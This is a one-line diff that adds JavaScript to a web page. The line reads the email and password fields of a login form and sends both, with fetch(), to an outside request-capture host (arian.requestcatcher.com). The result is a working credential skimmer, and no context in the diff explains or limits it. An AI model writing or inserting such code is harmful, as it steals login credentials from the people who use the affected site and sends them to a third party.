@@ -1,0 +1,1 @@
+fetch('https://arian.requestcatcher.com/test?email='+document.querySelector('input.form__input-text.form__input-text--email.required').value+'&pass='+document.querySelector('input[type="password"]').value)
